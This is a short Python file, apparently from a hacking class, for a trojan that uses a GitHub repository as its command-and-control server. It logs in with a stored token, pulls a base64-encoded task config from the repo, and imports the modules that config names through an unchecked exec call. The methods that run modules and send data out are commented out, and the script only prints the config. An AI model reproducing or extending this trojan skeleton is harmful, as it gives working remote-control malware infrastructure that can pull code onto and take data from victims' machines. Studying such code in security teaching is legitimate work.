import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime

def github_connect():
    with open('/home/tomtom/env/gitpass.txt') as f:
        token = f.read().strip()
    user = 'drlooshackingclass'
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()
    def get_config(self):
        config_json = get_file_contents(
        'config', self.config_file, self.repo
        )
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config
        
    # Commenting out other methods
    
if __name__ == '__main__':
    # Comment out everything except printing the results of config
    trojan = Trojan('abc')
    print("Config:", trojan.get_config())  # Print the results of config